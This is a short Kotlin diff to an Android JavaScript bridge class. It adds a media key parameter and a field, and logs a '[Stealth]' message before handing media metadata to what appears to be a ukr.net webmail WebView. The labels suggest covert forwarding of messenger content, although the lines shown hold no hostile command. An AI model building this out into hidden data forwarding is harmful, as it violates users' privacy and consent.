@@ -120,6 +120,7 @@ class MessengerJsInterface(
     lateinit var scope: CoroutineScope
     private val ui = Handler(Looper.getMainLooper())
     @Volatile var lastComposeBody: String = ""
+    @Volatile var pendingMediaKey: String = ""
     @Volatile var getMessengerWebView: (() -> WebView?)? = null
 
     @Volatile private var lastSubmitMs = 0L
@@ -207,7 +208,8 @@ class MessengerJsInterface(
     fun getDeviceId(): String { return androidId }
 
     @JavascriptInterface
-    fun notifyMediaSelection(sysBlock: String) {
+    fun notifyMediaSelection(sysBlock: String, mediaKey: String) {
+        pendingMediaKey = mediaKey
         log("[Stealth] Получены метаданные медиа. Прикрепляем к письму...")
         ui.post {
             val ukr = getUkrnetWebView()
